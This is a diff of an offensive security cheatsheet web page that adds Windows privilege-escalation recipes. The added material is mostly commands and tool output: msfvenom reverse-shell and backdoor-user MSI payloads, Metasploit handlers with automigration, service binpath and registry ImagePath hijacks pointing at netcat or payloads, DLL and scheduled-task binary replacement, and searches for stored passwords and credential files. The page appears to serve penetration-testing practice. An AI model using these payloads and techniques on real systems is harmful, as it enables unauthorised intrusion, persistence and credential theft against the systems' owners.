@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-21T10:04:00 CET">
+<meta name="revised" content="2020-01-04T16:29:46 CET">
 <title>Tricks :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -276,6 +276,13 @@
         <div>
           <a href="/open-source-intelligence-osint/human-recon/social-networks/tinder/">
             Tinder
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/snapchat/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/social-networks/snapchat/">
+            Snapchat
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -614,6 +621,13 @@
         <div>
           <a href="/web-attacks/client-side-injections/csrf/">
             CSRF Injections
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/web-attacks/client-side-injections/misc_others/" class="dd-item">
+        <div>
+          <a href="/web-attacks/client-side-injections/misc_others/">
+            MISC &amp; Others
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1416,7 +1430,33 @@ python3 gtfo -e Certutil.exe
 
 <span style="color:#75715e"># You can feed syteminfo output to windows-exploit-suggester</span>
 ./windows-exploit-suggester.py --update
-./windows-exploit-suggester.py --database <span style="color:#ae81ff">2019</span>-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt
+./windows-exploit-suggester.py --database <span style="color:#ae81ff">2019</span>-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt
+
+<span style="color:#75715e"># Metasploit also has a module</span>
+ &gt; use post/multi/recon/local_exploit_suggester
+msf5 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; options
+
+Module options <span style="color:#f92672">(</span>post/multi/recon/local_exploit_suggester<span style="color:#f92672">)</span>:
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  <span style="color:#111">false</span>            yes       Displays a detailed description <span style="color:#00a8c8">for</span> the available exploits
+
+msf5 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> SESSION <span style="color:#ae81ff">1</span>
+<span style="color:#111">SESSION</span> <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+msf5 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - Collecting <span style="color:#111">local</span> exploits <span style="color:#00a8c8">for</span> x86/windows...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - <span style="color:#ae81ff">29</span> exploit checks are being tried...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
 
 <span style="color:#75715e"># Getting shell in limited interpreter</span>
 system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;start cmd.exe /k </span><span style="color:#111">$cmd</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">)</span>
@@ -1441,6 +1481,33 @@ powershell.exe <span style="color:#d88200">&#34;IEX (New-Object  Net.WebClient).
 %userprofile%<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\T</span>eams<span style="color:#8045ff">\U</span>pdate.exe --processStart payload.exe --process-start-args <span style="color:#d88200">&#34;whatever args&#34;</span></code></pre></div>
 <p><br/></p>
 
+<h3 id="process-migration">Process Migration</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Migration can be essential to get persistence</span>
+<span style="color:#75715e"># You might need to migrate into a classic process</span>
+msf&gt; ps aux 
+msf&gt; migrate &lt;pid&gt;
+
+<span style="color:#75715e"># Automigrate is also sometimes needed if the shell is dying quickly</span>
+$ cat automigrate.rc
+run post/windows/manage/migrate
+
+msf5 &gt; use exploit/multi/handler
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> LHOST xx.xx.xx.xx
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> LPORT <span style="color:#ae81ff">5566</span>
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> AutoRunScript multi_console_command -r /path/to/automigrate.rc
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit</code></pre></div>
+<p><br/></p>
+
+<h3 id="folder-and-files-rights">Folder and Files Rights</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># icacls allows you to check for files and folder permissions</span>
+C:&gt; icacls Desktop/
+C:&gt; icacls root.txt
+
+<span style="color:#75715e"># If you have rights on the folder but not especially on files, you can grant them</span>
+C:&gt; icacls root.txt /grant user:F</code></pre></div>
+<p><br/></p>
+
 <h3 id="unquoted-paths">Unquoted Paths</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Some paths are vulnerable</span>
 <span style="color:#75715e"># It occurs because Windows will try for every whitespace, to find the binary in every intermediate folder</span>
@@ -1451,7 +1518,22 @@ C:<span style="color:#8045ff">\P</span>rogram.exe
 C:<span style="color:#8045ff">\P</span>rogram Files.exe
 
 <span style="color:#75715e"># The following command will display affected services</span>
-wmic service get name,displayname,pathname,startmode <span style="color:#111">|</span>findstr /i <span style="color:#d88200">&#34;Auto&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;C:\Windows\\&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;&#34;&#34;</span></code></pre></div>
+wmic service get name,displayname,pathname,startmode <span style="color:#111">|</span>findstr /i <span style="color:#d88200">&#34;Auto&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;C:\Windows\\&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;&#34;&#34; rmthelastquote&#34;</span>
+
+<span style="color:#75715e"># Reverse shell</span>
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o A.exe
+msf&gt; upload -f A.exe
+sc stop <span style="color:#d88200">&#34;Vulnerable Service&#34;</span>
+
+<span style="color:#75715e"># If can&#39;t, you can reboot</span>
+shutdown /r /t <span style="color:#ae81ff">0</span>
+
+<span style="color:#75715e"># Session will die quickly, so it is necessary to automigrate</span>
+<span style="color:#75715e"># when a service starts in Windows operating systems, it must communicate with the Service Control Manager.</span>
+<span style="color:#75715e"># If it’s not, Service Control Manager thinks that something is not going well and terminates the process</span>
+
+<span style="color:#75715e"># MSF Module for this vulnerability</span>
+exploit/windows/local/trusted_service_path</code></pre></div>
 <p><br/></p>
 
 <h3 id="clear-text-passwords">Clear text passwords</h3>
@@ -1478,7 +1560,15 @@ reg query HKEY_LOCAL_MACHINE<span style="color:#8045ff">\S</span>OFTWARE<span st
 
 <span style="color:#75715e"># Search for passwords in the registry</span>
 reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s</code></pre></div>
+reg query HKCU /f password /t REG_SZ /s
+
+<span style="color:#75715e"># searhc for files containing keywoards</span>
+dir /s *pass* <span style="color:#f92672">==</span> *cred* <span style="color:#f92672">==</span> *vnc* <span style="color:#f92672">==</span> *.config*
+
+<span style="color:#75715e"># Interesting files</span>
+C:<span style="color:#8045ff">\u</span>nattend.xml
+C:<span style="color:#8045ff">\s</span>ysprep.inf
+C:<span style="color:#8045ff">\s</span>ysprep<span style="color:#8045ff">\s</span>ysprep.xml</code></pre></div>
 <p><br/></p>
 
 <h3 id="run-as">Run As</h3>
@@ -1500,17 +1590,123 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo <span style="color:#d88200">&#39;
 
 <span style="color:#75715e"># Check the value of this registry</span>
 reg query HKLM<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\P</span>olicies<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\I</span>nstaller /v AlwaysInstallElevated
+reg query HKCU<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\P</span>olicies<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\I</span>nstaller /v AlwaysInstallElevated
 
-<span style="color:#75715e"># If set to 1, you can create your own MSI</span>
+<span style="color:#75715e"># If set to 1, you can create your own MSI (or msi-nouac)</span>
+<span style="color:#75715e"># Add user</span>
 msfvenom -p windows/adduser <span style="color:#111">USER</span><span style="color:#f92672">=</span>backdoor <span style="color:#111">PASS</span><span style="color:#f92672">=</span>backdoor123 -f msi -o evil.msi
 
+<span style="color:#75715e"># Or reverse shell</span>
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o Payload.exe
+msfvenom -f msi-nouac -p windows/exec <span style="color:#111">cmd</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;C:\Users\testuser\AppData\Local\Temp\Payload.exe&#34;</span> &gt; malicious.msi
+
+
 <span style="color:#75715e"># You can then use msiexec to execute the payload</span>
-msiexec /quiet /qn /i C:<span style="color:#8045ff">\e</span>vil.msi</code></pre></div>
+<span style="color:#75715e"># /quiet = no msg to user, /qn = no GUI, /i = regular install (no admin)</span>
+msiexec /quiet /qn /i C:<span style="color:#8045ff">\e</span>vil.msi
+
+<span style="color:#75715e"># MSF module</span>
+exploit/windows/local/always_install_elevated</code></pre></div>
 <p><br/></p>
 
 <h3 id="powersploit-powerup">PowerSploit / PowerUp</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Copy PowerUp.ps1 to Powershell bypass Execution policy</span>
-Invoke-AllChecks</code></pre></div>
+Invoke-AllChecks</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf shell&gt; powershell.exe -exec bypass -Command “<span style="color:#111">&amp;</span> <span style="color:#f92672">{</span>Import-Module .<span style="color:#8045ff">\P</span>owerUp.ps1<span style="color:#111">;</span> Invoke-AllChecks<span style="color:#f92672">}</span>”</code></pre></div>
+<p><br/></p>
+
+<h3 id="services-and-scheduled-tasks">Services and Scheduled Tasks</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Query one service</span>
+sc qc Spooler
+
+<span style="color:#75715e"># Check permissions</span>
+accesschk.exe -ucqv Spooler
+
+C:<span style="color:#8045ff">\&gt;</span> accesschk.exe -uwcqv <span style="color:#d88200">&#34;Authenticated Users&#34;</span> *
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS
+
+accesschk.exe -ucqv SSDPSRV
+accesschk.exe -ucqv upnphost
+
+<span style="color:#75715e"># Search for specific service (looking for write permissions)</span>
+sc qc upnphost
+
+<span style="color:#75715e"># Following rights can give a SYSTEM shell</span>
+SERVICE_CHANGE_CONFIG <span style="color:#f92672">(</span>Can reconfigure the service binary<span style="color:#f92672">)</span>
+WRITE_DAC <span style="color:#f92672">(</span>Can reconfigure permissions, leading to <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>
+WRITE_OWNER <span style="color:#f92672">(</span>Can become owner and reconfigure permissions<span style="color:#f92672">)</span>
+GENERIC_WRITE <span style="color:#f92672">(</span>Inherits SERVICE_CHANGE_CONFIG<span style="color:#f92672">)</span>
+GENERIC_ALL <span style="color:#f92672">(</span>Inherits SERVICE_CHANGE_CONFIG<span style="color:#f92672">)</span>
+
+<span style="color:#75715e"># Exploit a vulnerable service (or adding new user)</span>
+sc config upnphost <span style="color:#111">binpath</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&#34;</span>
+sc config upnphost <span style="color:#111">obj</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;.\LocalSystem&#34;</span> <span style="color:#111">password</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span>
+sc qc upnphost
+net start upnphost
+
+<span style="color:#75715e"># You can use subinacl.exe to check vulnerable service permissions</span>
+subinacl.exe /keyreg <span style="color:#d88200">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&#34;</span> /display
+
+<span style="color:#75715e"># If you have full control over a registry key, you can override it</span>
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o Payload.exe
+reg add <span style="color:#d88200">&#34;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service&#34;</span> /t REG_EXPAND_SZ /v ImagePath /d <span style="color:#d88200">&#34;C:\Users\testuser\AppData\Local\Temp\Payload.exe&#34;</span> /f
+shutdown /r /t <span style="color:#ae81ff">0</span>
+
+<span style="color:#75715e"># MSF module</span>
+exploit/windows/local/service_permissions</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">echo</span> %path%
+
+<span style="color:#75715e"># Check permissions for a service in PAth</span>
+accesschk.exe -dqv <span style="color:#d88200">&#34;C:\Python27&#34;</span>
+cacls <span style="color:#d88200">&#34;C:\Python27&#34;</span>
+
+<span style="color:#75715e"># Need to check the IKEEXT service</span>
+sc qc IKEEXT
+
+<span style="color:#75715e"># If all conditions are met, you can craft a shell</span>
+msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> O
+msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> D &gt; 
+/root/Desktop/evil.dll
+
+<span style="color:#75715e"># Then upload it and rename it</span>
+copy evil.dll C:<span style="color:#8045ff">\P</span>ython27<span style="color:#8045ff">\w</span>lbsctrl.dll
+dir C:<span style="color:#8045ff">\P</span>ython27
+
+<span style="color:#75715e"># Then system reboot</span>
+
+<span style="color:#75715e"># DLL Hijacking other methods</span>
+msf&gt; search -f Vulnerable.exe
+msf&gt; download Vulnerable.exe
+
+<span style="color:#75715e"># You can use procmon to check missing DLL (add Process Name, Result, Name)</span>
+<span style="color:#75715e"># Then</span> 
+msf&gt; search -f hijackable.dll</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Scheduled Tasks</span>
+<span style="color:#75715e"># For example, a TFTP server</span>
+Task To Run: E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\t</span>ftp.exe <span style="color:#ae81ff">10</span>.1.1.99 GET log.out E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\L</span>ogs<span style="color:#8045ff">\l</span>og.txt
+
+<span style="color:#75715e"># Check rights for the folder</span>
+accesschk.exe -dqv <span style="color:#d88200">&#34;E:\GrabLogs&#34;</span>
+dir <span style="color:#d88200">&#34;E:\GrabLogs&#34;</span>
+
+<span style="color:#75715e"># If running as SYSTEM and write permissions for users, you can craft a payload</span>
+msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> O
+msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> R <span style="color:#111">|</span> msfencode -t
+exe &gt; /root/Desktop/evil-tftp.exe
+
+<span style="color:#75715e"># Then copy payload</span>
+copy evil-tftp.exe E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\t</span>ftp.exe</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI</span>
+<span style="color:#75715e"># pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag</span>
+<span style="color:#75715e"># to automatically accept the EULA.</span>
+accesschk.exe /accepteula ... ... ...
+
+<span style="color:#75715e"># Find all weak folder permissions per drive.</span>
+accesschk.exe -uwdqs Users c:<span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>accesschk.exe -uwdqs <span style="color:#d88200">&#34;Authenticated Users&#34;</span> c:<span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>
+<span style="color:#75715e"># Find all weak file permissions per drive.</span>
+accesschk.exe -uwqs Users c:<span style="color:#8045ff">\*</span>.*
+accesschk.exe -uwqs <span style="color:#d88200">&#34;Authenticated Users&#34;</span> c:<span style="color:#8045ff">\*</span>.*</code></pre></div>
 
     
     
